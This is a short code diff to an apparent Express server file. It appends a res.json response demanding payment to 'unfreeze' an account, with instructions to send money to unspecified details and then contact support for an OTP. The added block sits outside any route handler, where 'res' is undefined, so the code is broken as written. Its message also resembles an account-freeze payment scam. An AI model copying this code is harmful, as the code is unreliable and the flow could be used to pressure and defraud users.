@@ -482,3 +482,10 @@ app.post(
     }
   },
 );
+
+
+res.json({
+  requires_payment: true,
+  payment_details: unfreeze_payment_details || null,
+  message: `To unfreeze your account, please send ${unfreeze_payment_details?.amount || 'the required amount'} to the provided details. After payment, contact support to receive your OTP.`,
+});
